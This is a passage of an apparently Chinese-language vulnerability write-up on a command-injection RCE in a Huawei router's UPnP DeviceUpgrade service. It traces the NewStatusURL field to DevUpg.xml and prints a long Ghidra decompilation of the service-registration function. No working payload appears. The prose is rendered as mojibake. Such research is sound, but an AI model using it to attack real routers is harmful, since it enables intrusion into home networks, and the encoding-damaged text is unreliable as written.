¼å¼•èµ·çš„ï¼Œå‘½ä»¤æ‹¼æ¥RCE.</p><p>å°è¯•æŸ¥çœ‹è¯¥å‡½æ•°çš„äº¤å‰å¼•ç”¨ï¼Œå‘ç°å¤±è´¥ã€‚<br><img src="https://i.bmp.ovh/imgs/2022/01/e3aa953461727c2d.png" alt=""><br>è¿™è¯´æ˜è¯¥å‡½æ•°æ˜¯è¢«é—´æ¥è°ƒç”¨çš„ï¼Œç›®å‰ä¸ºæ­¢ï¼Œç¬”è€…åªèƒ½æƒ³åˆ°ï¼Œè¯¥å‡½æ•°æ˜¯ç”±è™šå‡½æ•°è¡¨è°ƒç”¨ï¼ˆæ¯”è¾ƒå¸¸è§ï¼‰</p><p>å¯»æ‰¾è¯¥å‡½æ•°çš„è°ƒç”¨åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæ— æ³•å‰è¿›ï¼Œä½†æ˜¯æ¼æ´çš„æˆå› æ‰¾åˆ°äº†ã€‚</p><h3 id="æ¼æ´è§¦å‘æµç¨‹"><a class="header-anchor" href="#æ¼æ´è§¦å‘æµç¨‹">Â¶</a>æ¼æ´è§¦å‘æµç¨‹</h3><p>åˆšæ‰æˆ‘ä»¬å°è¯•ä»æ¼æ´å‡½æ•°çš„è°ƒç”¨å»å¯»æ‰¾æ¼æ´çš„è§¦å‘ç‚¹ï¼Œå¤±è´¥äº†ï¼Œæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¢ä¸€ç§æ–¹æ³•ï¼Œæ­£å‘çš„å»å¯»æ‰¾æ¼æ´çš„è§¦å‘ç‚¹ã€‚è¿›å…¥æ–‡ä»¶ç³»ç»Ÿï¼Œå°è¯•æœç´¢ï¼Œè¯¥å­—ç¬¦ä¸²åœ¨å“ªé‡Œå‡ºç°äº†ã€‚<code>grep -r &quot;NewStatusURL&quot;</code></p><p><img src="https://i.bmp.ovh/imgs/2022/01/d2e4c615c810c54f.png" alt=""><br>åœ¨upnpçš„æ–‡ä»¶å¤¹ä¸‹é¢å‘ç°äº†ä»…æœ‰<code>DevUpg.xml</code>ä¸­æœ‰è¯¥å­—ç¬¦ä¸²ã€‚ï¼ˆè¯´æ˜åªæœ‰è¯¥åœ°æ–¹ç”¨åˆ°äº†è¯¥å­—ç¬¦ä¸²ï¼‰</p><p>è€æ ·å­ï¼Œåœ¨Ghidraä¸­æœç´¢<code>DevUpg.xml</code>å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°ä¸€ä¸ªæœåŠ¡æ³¨å†Œå‡½æ•°ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">ATP_UPNP_RegDeviceAndService</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar3<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar4<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar5<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar6<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar7<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar8<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar9<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar10<span class="token punctuation">;</span>  undefined4 local_128<span class="token punctuation">;</span>  undefined4 local_124<span class="token punctuation">;</span>  undefined4 local_120<span class="token punctuation">;</span>  undefined4 local_11c<span class="token punctuation">;</span>  undefined4 local_118<span class="token punctuation">;</span>  undefined4 local_114<span class="token punctuation">;</span>  undefined4 local_110<span class="token punctuation">;</span>  undefined4 local_10c<span class="token punctuation">;</span>  undefined4 local_108<span class="token punctuation">;</span>  undefined4 local_104<span class="token punctuation">;</span>  undefined4 local_100<span class="token punctuation">;</span>  undefined4 local_fc<span class="token punctuation">;</span>  undefined4 local_f8<span class="token punctuation">;</span>  undefined4 local_f4<span class="token punctuation">;</span>  undefined4 local_f0 <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> local_e8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_e4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_e0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_dc<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_d8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_d4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_d0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_cc<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_c8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_c4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_c0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_bc<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_b8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_b4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_b0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_ac<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_a8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_a4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_a0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_9c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_98<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_94<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_90<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_8c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_88<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_84<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_80<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_7c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_78<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_74<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_70<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_6c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_68<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_64<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_60<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_5c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_58<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_54<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_50<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_4c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_48<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_44<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_40<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_3c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_38<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_34<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_30<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_2c<span class="token punctuation">;</span>    local_128 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_124 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_120 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_11c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_118 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_114 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_110 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_10c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_108 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_104 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_100 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_fc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_f8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_f4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  iVar1 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegDevice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>g_stDevDesc<span class="token punctuation">.</span>_4_4_<span class="token punctuation">,</span><span class="token string">"InternetGatewayDevice:1"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_128<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar2 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token string">"urn:www-huawei-com:service:DeviceUpgrade:1"</span><span class="token punctuation">,</span><span class="token string">"DevUpg.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>                              <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_124<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar3 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token string">"Layer3Forwarding:1"</span><span class="token punctuation">,</span><span class="token string">"L3Fwd.xml"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_120<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar4 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token string">"LANConfigSecurity:1"</span><span class="token punctuation">,</span><span class="token string">"LANSec.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_118<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar5 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token string">"urn:www-huawei-com:service:DeviceConfig:1"</span><span class="token punctuation">,</span><span class="token string">"DevCfg.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span>                              <span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_11c<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar5 <span class="token operator">=</span> iVar2 <span class="token operator">+</span> iVar1 <span class="token operator">+</span> iVar3 <span class="token operator">+</span> iVar4 <span class="token operator">+</span> iVar5<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar5 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    iVar1 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegDevice</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"WANDevice:1"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_110<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar2 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_110<span class="token punctuation">,</span><span class="token string">"WANCommonInterfaceConfig:1"</span><span class="token punctuation">,</span><span class="token string">"WanCommonIfc1.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>                                <span class="token operator">&amp;</span>local_10c<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar3 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_110<span class="token punctuation">,</span><span class="token string">"WANDSLInterfaceConfig:1"</span><span class="token punctuation">,</span><span class="token string">"WanDslIfCfg.xml"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>                                <span class="token operator">&amp;</span>local_114<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar4 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegDevice</span><span class="token punctuation">(</span>local_110<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"WANConnectionDevice:1"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_108<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar6 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_108<span class="token punctuation">,</span><span class="token string">"WANDSLLinkConfig:1"</span><span class="token punctuation">,</span><span class="token string">"WanDslLink.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>local_f0<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar7 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_108<span class="token punctuation">,</span><span class="token string">"WANIPConnection:1"</span><span class="token punctuation">,</span><span class="token string">"WanIpConn.xml"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_100<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar8 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_108<span class="token punctuation">,</span><span class="token string">"WANPPPConnection:1"</span><span class="token punctuation">,</span><span class="token string">"WanPppConn.xml"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_104<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar9 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegDevice</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"LANDevice:1"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_fc<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar10 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_fc<span class="token punctuation">,</span><span class="token string">"LANHostConfigManagement:1"</span><span class="token punctuation">,</span><span class="token string">"LanHostCfgMgmt.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>                                 <span class="token operator">&amp;</span>local_f8<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar5 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_fc<span class="token punctuation">,</span><span class="token string">"WLANConfiguration:1"</span><span class="token punctuation">,</span><span class="token string">"WLANCfg.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_f4<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar5 <span class="token operator">=</span> iVar2 <span class="token operator">+</span> iVar1 <span class="token operator">+</span> iVar3 <span class="token operator">+</span> iVar4 <span class="token operator">+</span> iVar6 <span class="token operator">+</span> iVar7 <span class="token operator">+</span> iVar8 <span class="token operator">+</span> iVar9 <span class="token operator">+</span> iVar10 <span class="token operator">+</span> iVar5<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar5 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      local_e8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_124<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar1 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_124<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_2c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_30 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_34 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_38 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_3c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_40 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_44 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_48 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_4c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_50 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x34</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_54 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_58 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x36</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_5c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x37</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_60 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_64 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x39</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_68 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_118<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_6c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_11c<span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_70 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_11c<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_74 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_11c<span class="token punctuation">,</span><span class="token number">0xb</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_78 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_11c<span class="token punctuation">,</span><span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_7c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0xd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_80 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0xe</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_84 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0xf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_88 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_8c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_90 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_94 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_98 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_9c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_a0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_a4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x17</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_a8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_ac <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f8<span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_b0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f8<span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_b4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f8<span class="token punctuation">,</span><span class="token number">0x1b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_b8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f8<span class="token punctuation">,</span><span class="token number">0x1c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_bc <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_10c<span class="token punctuation">,</span><span class="token number">0x1d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_c0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_10c<span class="token punctuation">,</span><span class="token number">0x1e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_c4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x1f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_c8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_cc <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_d0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_d4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x2e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_d8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_dc <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_e0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_e4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x2a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar2 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x2b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar3 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x2c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar6 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar7 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x25</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar9 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar10 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x27</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar5 <span class="token 